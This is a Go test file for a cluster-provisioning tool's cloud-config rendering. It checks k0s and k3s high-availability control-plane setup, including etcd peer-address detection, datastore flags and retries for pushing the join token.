// cluster via the controller-join token; a conflicting fresh ClusterConfig on the
// joiner is a second reason HA never forms. The INIT node (fresh ClusterConfig)
// keeps them. Mirrors the CAPV template's .IsInitControlPlane CIDR gating.
func TestHA_CapkK0sJoinDropsClusterCIDRs(t *testing.T) {
	join, err := RenderK0sCloudConfig(capkK0sHAWithCIDR("join"))
	if err != nil {
		t.Fatalf("render k0s CAPK join: %v", err)
	}
	k0sYAML := extractWriteFile(t, join, "/etc/k0s/k0s.yaml")
	if k0sYAML == "" {
		t.Fatal("k0s CAPK join must still write /etc/k0s/k0s.yaml (api.sans + etcd peerAddress)")
	}
	for _, forbidden := range []string{"podCIDR", "serviceCIDR", "network:"} {
		if strings.Contains(k0sYAML, forbidden) {
			t.Errorf("k0s CAPK join /etc/k0s/k0s.yaml must NOT contain %q — cluster CIDRs are inherited via the join token (BUG #2)", forbidden)
		}
	}

	// The INIT node, with the same CIDR inputs, MUST keep podCIDR/serviceCIDR.
	initOut, err := RenderK0sCloudConfig(capkK0sHAWithCIDR("init"))
	if err != nil {
		t.Fatalf("render k0s CAPK init: %v", err)
	}
	initYAML := extractWriteFile(t, initOut, "/etc/k0s/k0s.yaml")
	if !strings.Contains(initYAML, "podCIDR: 10.244.0.0/16") {
		t.Error("k0s CAPK init must keep the cluster podCIDR in its fresh ClusterConfig")
	}
	if !strings.Contains(initYAML, "serviceCIDR: 10.96.0.0/12") {
		t.Error("k0s CAPK init must keep the cluster serviceCIDR in its fresh ClusterConfig")
	}
}

// TestHA_CapkK0sEtcdPeerAddress asserts the dual-interface bridge etcd wiring
// (2026-07-02 HA lab): EVERY CAPK k0s HA control-plane node (init AND join) must
// (a) set spec.storage.etcd.peerAddress to the __ETCD_PEER_ADDR__ sentinel in
// /etc/k0s/k0s.yaml, and (b) render the k0scontroller ExecStartPre drop-in +
// bridge-detect script that substitutes the sentinel with the node's routable
// bridge IP before k0s first starts. Without a routable per-node peer address the
// masquerade self-address (10.0.2.2, identical on every VM) would be advertised
// and etcd quorum could never form.
func TestHA_CapkK0sEtcdPeerAddress(t *testing.T) {
	const sentinel = "__ETCD_PEER_ADDR__"
	const scriptPath = "/usr/local/bin/kairos-k0s-etcd-peer-addr.sh"
	const dropinPath = "/etc/systemd/system/k0scontroller.service.d/z-etcd-peer-addr.conf"

	bashPath, _ := exec.LookPath("bash")

	for _, role := range []string{"init", "join"} {
		role := role
		t.Run(role, func(t *testing.T) {
			out, err := RenderK0sCloudConfig(capkK0sHAWithCIDR(role))
			if err != nil {
				t.Fatalf("render k0s CAPK %s: %v", role, err)
			}

			// (a) etcd peerAddress sentinel in /etc/k0s/k0s.yaml.
			k0sYAML := extractWriteFile(t, out, "/etc/k0s/k0s.yaml")
			for _, want := range []string{"storage:", "etcd:", "peerAddress:", sentinel} {
				if !strings.Contains(k0sYAML, want) {
					t.Errorf("k0s CAPK %s /etc/k0s/k0s.yaml must contain %q for the per-node etcd peer address", role, want)
				}
			}

			// (a2) api.address sentinel — the k0s API advertise address must ALSO be
			// the routable bridge IP, else `k0s token create` bakes the unroutable
			// masquerade self (10.0.2.2) into the controller-join token and joiners
			// can never reach the init's join API (Phase-4 CAPK-HA lab root cause).
			for _, want := range []string{"api:", "address:", "__API_ADDR__"} {
				if !strings.Contains(k0sYAML, want) {
					t.Errorf("k0s CAPK %s /etc/k0s/k0s.yaml must contain %q for the per-node API advertise address", role, want)
				}
			}

			// (b) the ExecStartPre drop-in references the bridge-detect script,
			// and the script exists and is valid bash.
			dropin := extractWriteFile(t, out, dropinPath)
			if dropin == "" {
				t.Fatalf("k0s CAPK %s must render the k0scontroller ExecStartPre drop-in %q", role, dropinPath)
			}
			if !strings.Contains(dropin, "ExecStartPre=") || !strings.Contains(dropin, scriptPath) {
				t.Errorf("k0s CAPK %s drop-in must invoke %q via ExecStartPre; got:\n%s", role, scriptPath, dropin)
			}

			script := extractWriteFile(t, out, scriptPath)
			if script == "" {
				t.Fatalf("k0s CAPK %s must render the bridge-detect script %q", role, scriptPath)
			}
			// The script substitutes the sentinel and selects the routable bridge
			// IP by property (NOT the 10.0.2.x masquerade, NOT loopback) — never by
			// a hardcoded interface name.
			for _, want := range []string{sentinel, "10.0.2.", "127.", "sed -i", "ip -o -4 addr show"} {
				if !strings.Contains(script, want) {
					t.Errorf("k0s CAPK %s bridge-detect script must contain %q", role, want)
				}
			}
			if strings.Contains(script, "eth1") {
				t.Errorf("k0s CAPK %s bridge-detect script must NOT hardcode the eth1 interface name (select by property)", role)
			}
			if bashPath != "" {
				f := filepathJoinTemp(t, "k0s-etcd-peer-addr-"+role+".sh")
				if werr := os.WriteFile(f, []byte(script), 0o600); werr != nil {
					t.Fatalf("write temp script: %v", werr)
				}
				if b, berr := exec.Command(bashPath, "-n", f).CombinedOutput(); berr != nil {
					t.Fatalf("k0s CAPK %s bridge-detect script is not valid bash: %v\n%s", role, berr, b)
				}
			}
		})
	}
}

// TestHA_CapkK0sSingleHasNoEtcdPeerAddress asserts the block is HA-only: a
// single-node CAPK k0s control plane (no etcd quorum) must render NEITHER the
// etcd peerAddress block NOR the bridge-detect ExecStartPre drop-in/script.
func TestHA_CapkK0sSingleHasNoEtcdPeerAddress(t *testing.T) {
	single := TemplateData{
		Role:             "control-plane",
		ControlPlaneRole: "single",
		SingleNode:       true,
		Hostname:         "kairos-cp-0",
		UserName:         "kairos",
		UserGroups:       []string{"admin"},
		IsKubeVirt:       true,
		PodCIDR:          "10.244.0.0/16",
		ServiceCIDR:      "10.96.0.0/12",
	}
	out, err := RenderK0sCloudConfig(single)
	if err != nil {
		t.Fatalf("render k0s CAPK single: %v", err)
	}
	k0sYAML := extractWriteFile(t, out, "/etc/k0s/k0s.yaml")
	for _, forbidden := range []string{"__ETCD_PEER_ADDR__", "peerAddress", "storage:"} {
		if strings.Contains(k0sYAML, forbidden) {
			t.Errorf("k0s CAPK single /etc/k0s/k0s.yaml must NOT contain %q (no etcd quorum on single-node)", forbidden)
		}
	}
	if extractWriteFile(t, out, "/usr/local/bin/kairos-k0s-etcd-peer-addr.sh") != "" {
		t.Error("k0s CAPK single must NOT render the bridge-detect script (HA-only)")
	}
	if extractWriteFile(t, out, "/etc/systemd/system/k0scontroller.service.d/z-etcd-peer-addr.conf") != "" {
		t.Error("k0s CAPK single must NOT render the k0scontroller ExecStartPre drop-in (HA-only)")
	}
	// A single-node CP still keeps its own cluster CIDRs (fresh ClusterConfig).
	if !strings.Contains(k0sYAML, "podCIDR: 10.244.0.0/16") {
		t.Error("k0s CAPK single must keep podCIDR (single is a fresh ClusterConfig, like init)")
	}
}

// TestHA_CapkK3sNodeIP asserts the dual-interface bridge etcd wiring for k3s
// (2026-07-03 HA lab): EVERY CAPK k3s HA control-plane node (init AND join) must
// render (a) the on-node node-ip detect script and (b) a k3s.service ExecStartPre
// drop-in that invokes it. Under KubeVirt masquerade the primary IP is the SLIRP
// self-address 10.0.2.2 (identical on every VM), so k3s embedded etcd must peer
// over the routable Multus lan-bridge NIC instead — the script detects that IP and
// writes node-ip into config.yaml.d BEFORE k3s starts. Unlike the k0s path there is
// NO static sentinel: the fail-safe writes the value at runtime and writes nothing
// if no routable IP is present (k3s falls back to its default node IP, no crash).
func TestHA_CapkK3sNodeIP(t *testing.T) {
	const scriptPath = "/usr/local/bin/kairos-k3s-node-ip.sh"
	const dropinPath = "/etc/systemd/system/k3s.service.d/z-node-ip.conf"
	const cfgPath = "/etc/rancher/k3s/config.yaml.d/92-node-ip.yaml"

	bashPath, _ := exec.LookPath("bash")

	for _, role := range []string{"init", "join"} {
		role := role
		t.Run(role, func(t *testing.T) {
			out, err := RenderK3sCloudConfig(haCPData(role, true))
			if err != nil {
				t.Fatalf("render k3s CAPK %s: %v", role, err)
			}

			// (b) the ExecStartPre drop-in invokes the node-ip script.
			dropin := extractWriteFile(t, out, dropinPath)
			if dropin == "" {
				t.Fatalf("k3s CAPK %s must render the k3s.service ExecStartPre drop-in %q", role, dropinPath)
			}
			if !strings.Contains(dropin, "ExecStartPre=") || !strings.Contains(dropin, scriptPath) {
				t.Errorf("k3s CAPK %s drop-in must invoke %q via ExecStartPre; got:\n%s", role, scriptPath, dropin)
			}

			// (a) the script detects the routable bridge IP by property (NOT the
			// 10.0.2.x masquerade, NOT loopback), never by a hardcoded interface
			// name, and writes node-ip into config.yaml.d.
			script := extractWriteFile(t, out, scriptPath)
			if script == "" {
				t.Fatalf("k3s CAPK %s must render the node-ip detect script %q", role, scriptPath)
			}
			for _, want := range []string{"10.0.2.", "127.", "ip -o -4 addr show", "node-ip:", cfgPath} {
				if !strings.Contains(script, want) {
					t.Errorf("k3s CAPK %s node-ip script must contain %q", role, want)
				}
			}
			if strings.Contains(script, "eth1") {
				t.Errorf("k3s CAPK %s node-ip script must NOT hardcode the eth1 interface name (select by property)", role)
			}

			// Fail-safe: NO static placeholder sentinel anywhere in the render — the
			// address is written at runtime, never shipped as a value k3s must
			// substitute (an unsubstituted sentinel would crash-loop the server).
			if strings.Contains(out, "__NODE_IP__") {
				t.Errorf("k3s CAPK %s must NOT ship a static __NODE_IP__ sentinel (node-ip is runtime-detected)", role)
			}

			if bashPath != "" {
				f := filepathJoinTemp(t, "k3s-node-ip-"+role+".sh")
				if werr := os.WriteFile(f, []byte(script), 0o600); werr != nil {
					t.Fatalf("write temp script: %v", werr)
				}
				if b, berr := exec.Command(bashPath, "-n", f).CombinedOutput(); berr != nil {
					t.Fatalf("k3s CAPK %s node-ip script is not valid bash: %v\n%s", role, berr, b)
				}
			}
		})
	}
}

// TestHA_CapkK3sSingleHasNoNodeIP asserts the node-ip block is HA-only: a
// single-node CAPK k3s control plane (no etcd quorum, no cross-VM peering) must
// render NEITHER the node-ip detect script NOR the k3s.service ExecStartPre drop-in.
func TestHA_CapkK3sSingleHasNoNodeIP(t *testing.T) {
	single := TemplateData{
		Role:             "control-plane",
		ControlPlaneRole: "single",
		SingleNode:       true,
		Hostname:         "kairos-cp-0",
		UserName:         "kairos",
		UserGroups:       []string{"admin"},
		IsKubeVirt:       true,
	}
	out, err := RenderK3sCloudConfig(single)
	if err != nil {
		t.Fatalf("render k3s CAPK single: %v", err)
	}
	if extractWriteFile(t, out, "/usr/local/bin/kairos-k3s-node-ip.sh") != "" {
		t.Error("k3s CAPK single must NOT render the node-ip detect script (HA-only)")
	}
	if extractWriteFile(t, out, "/etc/systemd/system/k3s.service.d/z-node-ip.conf") != "" {
		t.Error("k3s CAPK single must NOT render the k3s.service ExecStartPre drop-in (HA-only)")
	}
}

// TestHA_K3sDatastoreFlagsPinnedInConfigDir is the regression guard for the
// init-ordering bug measured on the beskar7/CAPV HA lab (2026-09-07).
//
// provider-kairos delivers `k3s.args:` as a systemd drop-in
// (/etc/systemd/system/k3s.service.d/override.conf). On an instrumented run that
// file landed at 23:10:16 — three seconds AFTER k3s.service had already been
// started at 23:10:13. k3s selects its datastore on its FIRST start and never
// migrates, so it came up as a plain `k3s server` on SQLite with a random server
// token; --cluster-init / --server / --token-file were ignored for the life of
// the node. The failure is silent: the init node reports "etcd disabled" and
// every joiner forms its OWN single-node cluster.
//
// The boot-stage write_files, by contrast, landed at 23:10:13.318 — BEFORE the
// first start — and k3s re-reads config.yaml.d on every start. So the flags that
// must be right on the first start are pinned there too. This test asserts the
// drop-in exists with the correct content for init and join on both infra
// flavours, and that it is absent for single-node and workers (which have no
// datastore choice to get wrong).
func TestHA_K3sDatastoreFlagsPinnedInConfigDir(t *testing.T) {
	const path = "/etc/rancher/k3s/config.yaml.d/93-ha-datastore.yaml"
	const tokenLine = "token-file: /etc/rancher/k3s/server-token"

	for _, kv := range []bool{false, true} { // CAPV, CAPK
		infra := "capv"
		if kv {
			infra = "capk"
		}

		t.Run(infra+"/init", func(t *testing.T) {
			d := haCPData("init", kv)
			d.JoinToken = "K10shared::server:tokenvalue"
			out, err := RenderK3sCloudConfig(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			content := extractWriteFile(t, out, path)
			if content == "" {
				t.Fatalf("init render missing %q — --cluster-init would arrive too late to pick the datastore", path)
			}
			if !strings.Contains(content, "cluster-init: true") {
				t.Errorf("init %s missing cluster-init: true, got:\n%s", path, content)
			}
			if !strings.Contains(content, tokenLine) {
				t.Errorf("init %s missing %q — init would generate a random server token, got:\n%s", path, tokenLine, content)
			}
			if strings.Contains(content, "server:") {
				t.Errorf("init %s must not set server: (it bootstraps, it does not join), got:\n%s", path, content)
			}
		})

		t.Run(infra+"/join", func(t *testing.T) {
			d := haCPData("join", kv)
			out, err := RenderK3sCloudConfig(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			content := extractWriteFile(t, out, path)
			if content == "" {
				t.Fatalf("join render missing %q — --server would arrive too late and the node would form its own cluster", path)
			}
			// The join URL must be the same stable endpoint the k3s.args --server
			// uses, so the late override is a no-op when it finally lands.
			endpoint := d.ManagementEndpoint.ControlPlaneEndpointHost
			if kv {
				endpoint = d.ControlPlaneLBEndpoint
			}
			want := "server: https://" + endpoint + ":6443"
			if !strings.Contains(content, want) {
				t.Errorf("join %s missing %q, got:\n%s", path, want, content)
			}
			if !strings.Contains(content, tokenLine) {
				t.Errorf("join %s missing %q, got:\n%s", path, tokenLine, content)
			}
			if strings.Contains(content, "cluster-init") {
				t.Errorf("join %s must not set cluster-init (it joins, it does not bootstrap), got:\n%s", path, content)
			}
			if !strings.Contains(out, "--server=https://"+endpoint+":6443") {
				t.Errorf("join k3s.args --server must match the config.yaml.d server: value (%s)", endpoint)
			}
		})

		t.Run(infra+"/single", func(t *testing.T) {
			d := haCPData("single", kv)
			out, err := RenderK3sCloudConfig(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			if strings.Contains(out, path) {
				t.Errorf("single-node render must not write %q — it has no HA datastore to pin", path)
			}
		})

		t.Run(infra+"/worker", func(t *testing.T) {
			d := haCPData("init", kv)
			d.Role = "worker"
			d.K3sServerURL = "https://192.168.1.240:6443"
			d.K3sToken = "K10worker::server:token"
			out, err := RenderK3sCloudConfig(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			if strings.Contains(out, path) {
				t.Errorf("worker render must not write %q — agents hold no datastore", path)
			}
		})
	}
}

// TestHA_K0sJoinTokenPushRetries guards the k0s HA deadlock found on the
// bare-metal lab (2026-09-08).
//
// initMachineJoinable blocks every k0s joiner until the per-cluster
// controller-join Secret is non-empty, and only the init node can fill it. The
// push ran in a oneshot unit that made ONE attempt at `k0s token create`, four
// seconds after k0s started. The bootstrap-token machinery was not serving yet,
// create returned empty, and the script logged "will retry on next boot" — but
// nothing reboots the node, so the unit stayed `active (exited)` and the gate
// held for 45 minutes. The identical command run by hand afterwards returned a
// 1738-byte token, so the failure was purely a startup race with a permanent
// consequence.
//
// Both steps must retry: an empty create and a failed PATCH strand the cluster
// identically. The sibling providerID patch in the same script already retries
// 30x/5s and node registration waits 300s; this asserts the token path is no
// longer the one step that gives up immediately.
func TestHA_K0sJoinTokenPushRetries(t *testing.T) {
	for _, kv := range []bool{false, true} { // CAPV, CAPK — both carry the block
		infra := "capv"
		if kv {
			infra = "capk"
		}
		t.Run(infra, func(t *testing.T) { assertK0sJoinTokenRetries(t, kv) })
	}
}

func assertK0sJoinTokenRetries(t *testing.T, kubevirt bool) {
	t.Helper()
	d := haCPData("init", kubevirt)
	d.ManagementEndpoint.JoinTokenSecretName = "ha-cluster-control-plane-join-token"
	out, err := RenderK0sCloudConfig(d)
	if err != nil {
		t.Fatalf("render: %v", err)
	}

	if !strings.Contains(out, "k0s token create --role=controller") {
		t.Fatal("k0s init render lost the controller-join token creation entirely")
	}

	// The message that described behaviour which does not exist must be gone.
	// Scoped to the token create: an identically-worded message on the
	// etcd-status reporter is a separate concern and deliberately untouched here.
	if strings.Contains(out, "k0s token create returned empty; will retry on next boot") {
		t.Error("the token create still claims it 'will retry on next boot' — nothing reboots " +
			"the node, so a single failed create strands every joiner")
	}

	for _, want := range []string{
		// create is retried rather than attempted once
		"for i in {1..60}; do",
		"k0s token create not ready yet, retrying in 5 seconds...",
		"still empty after 60 attempts",
		// the PATCH is retried too
		"for i in {1..30}; do",
		"join-token push returned",
		"after 30 attempts",
		// a failed curl yields an empty status; the 2xx test must tolerate it
		// rather than run an arithmetic comparison on "".
		"2[0-9][0-9]) pushed=yes ;;",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("k0s init render missing %q", want)
		}
	}

	// The token must still never be echoed, only enveloped (TOKEN-INV).
	for _, forbidden := range []string{
		`echo "${jt}"`,
		"echo ${jt}",
		`echo "token: ${jt}"`,
	} {
		if strings.Contains(out, forbidden) {
			t.Errorf("join token is logged via %q — it must only ever be base64-enveloped", forbidden)
		}
	}
}
